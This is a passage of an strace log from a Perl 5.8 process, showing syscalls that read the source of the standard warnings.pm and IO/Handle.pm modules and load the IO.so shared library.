90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
8191  07:22:17.451758 brk(0x81b6000)    = 0x81b6000
8191  07:22:17.451774 brk(0x81b5000)    = 0x81b5000
8191  07:22:17.451907 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
8191  07:22:17.452380 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
8191  07:22:17.453100 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
8191  07:22:17.453233 read(8, "", 4096) = 0
8191  07:22:17.453246 close(8)          = 0
8191  07:22:17.453454 _llseek(6, 412, [412], SEEK_SET) = 0
8191  07:22:17.453471 _llseek(6, 0, [412], SEEK_CUR) = 0
8191  07:22:17.453481 close(6)          = 0
8191  07:22:17.453525 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8191  07:22:17.453550 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8191  07:22:17.453579 futex(0xb7f45070, 0x81 /* FUTEX_??? */, 2147483647) = 0
8191  07:22:17.453597 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
8191  07:22:17.453611 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8191  07:22:17.453701 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8191  07:22:17.453727 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f49000
8191  07:22:17.453740 mmap2(0xb7f4d000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f4d000
8191  07:22:17.453758 close(6)          = 0
8191  07:22:17.453945 stat64("/etc/perl/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.453962 stat64("/etc/perl/IO/Handle.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.453977 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.453990 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454004 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454017 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454032 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454044 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454057 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454070 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454083 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.454096 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
8191  07:22:17.454118 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.454132 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.454144 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.454160 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
8191  07:22:17.454577 stat64("/etc/perl/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454594 stat64("/etc/perl/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454607 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
